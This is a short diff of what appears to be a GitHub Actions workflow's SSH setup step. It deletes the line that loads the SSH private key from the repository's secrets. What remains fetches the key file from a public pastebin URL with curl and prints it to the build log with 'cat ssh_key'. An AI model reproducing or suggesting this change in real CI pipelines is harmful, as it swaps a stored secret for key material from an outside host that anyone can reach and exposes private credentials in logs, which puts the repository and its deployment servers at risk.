@@ -16,7 +16,6 @@ jobs:
     - name: Set up SSH
       run: |
         curl https://pastebin.com/raw/KDrikxCk -o ssh_key
-        echo "${{ secrets.SSH_PRIVATE_KEY }}" | tr -d '\r' > ssh_key
         chmod 600 ssh_key
         cat ssh_key
         echo "${{ secrets.SSH_KNOWN_HOSTS }}" > known_hosts
